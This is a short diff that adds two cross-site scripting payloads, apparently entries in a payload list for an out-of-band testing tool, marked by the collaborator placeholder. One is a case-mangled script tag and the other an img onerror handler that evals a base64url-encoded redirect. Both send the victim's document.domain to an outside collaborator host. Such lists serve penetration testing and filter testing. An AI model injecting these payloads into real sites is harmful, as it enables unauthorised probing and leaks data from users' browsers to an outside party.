@@ -1,0 +1,2 @@
+<sCRiPT>document.location='!-VARIABLE_COLLABORATOR-!/?domain='+document.domain</sCRiPT>
+<img src onerror="eval(atob(unescape('<@base64url>window.location="!-VARIABLE_COLLABORATOR-!/?domain="+document.domain<@/base64url>')))">
